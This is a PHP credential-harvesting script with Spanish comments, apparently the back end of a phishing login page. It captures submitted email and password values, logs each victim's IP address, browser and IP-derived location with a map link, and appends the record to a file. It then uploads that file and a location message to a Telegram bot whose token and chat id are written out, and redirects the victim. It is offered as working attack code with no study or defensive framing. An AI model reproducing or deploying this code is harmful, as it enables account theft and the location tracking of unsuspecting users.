<?php
// === Datos del formulario ===
$username = $_POST['email'] ?? 'N/A';
$password = $_POST['pass'] ?? 'N/A';

// === IP del usuario ===
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// === Agente de navegador ===
$useragent = $_SERVER['HTTP_USER_AGENT'];

// === Fecha y hora ===
$fecha = date("Y-m-d H:i:s");

// === Obtener geolocalización IP ===
$geoDataJson = @file_get_contents("http://ip-api.com/json/$ip");
$geoData = json_decode($geoDataJson, true);

$lat = $geoData['lat'] ?? 'Desconocido';
$lon = $geoData['lon'] ?? 'Desconocido';
$city = $geoData['city'] ?? 'Desconocido';
$region = $geoData['regionName'] ?? 'Desconocido';
$country = $geoData['country'] ?? 'Desconocido';

// === Link de Google Maps ===
if ($lat !== 'Desconocido' && $lon !== 'Desconocido') {
    $maps_link = "https://www.google.com/maps?q=$lat,$lon";
} else {
    $maps_link = "No disponible";
}

// === Contenido del archivo ===
$entry = "[📅 $fecha]\n";
$entry .= "👤 Usuario: $username\n";
$entry .= "🔐 Clave: $password\n";
$entry .= "🌐 IP: $ip\n";
$entry .= "📍 Ubicación: $city, $region, $country\n";
$entry .= "🗺️ Maps: $maps_link\n";
$entry .= "📱 Navegador: $useragent\n\n";

// === Guardar en archivo ===
$filename = "test.txt";
file_put_contents($filename, $entry, FILE_APPEND);

// === Telegram bot config ===
$token = "7777741668:AAFpGpEQ-KS4hB6lKnYUi3VEw5WAbUEpcwQ";
$chat_id = "6392032041";

// === Mensaje con link de ubicación para enviar junto o aparte ===
$message_location = "📍 Nueva conexión desde: $city, $region, $country\n🗺️ Mapa: $maps_link";

// === Enviar archivo y mensaje por Telegram usando curl ===
$send_doc_url = "https://api.telegram.org/bot$token/sendDocument";
$send_msg_url = "https://api.telegram.org/bot$token/sendMessage";

// Enviar archivo
$post_fields = [
    'chat_id' => $chat_id,
    'document' => new CURLFile(realpath($filename)),
    'caption' => "📝 Nuevo acceso recibido"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_URL, $send_doc_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$result_doc = curl_exec($ch);
curl_close($ch);

// Enviar mensaje con ubicación
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $send_msg_url);
curl_setopt($ch2, CURLOPT_POST, true);
curl_setopt($ch2, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $message_location,
]);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
$result_msg = curl_exec($ch2);
curl_close($ch2);

// === Redirigir al usuario ===
header('Location: ./result.html');
exit;
?>

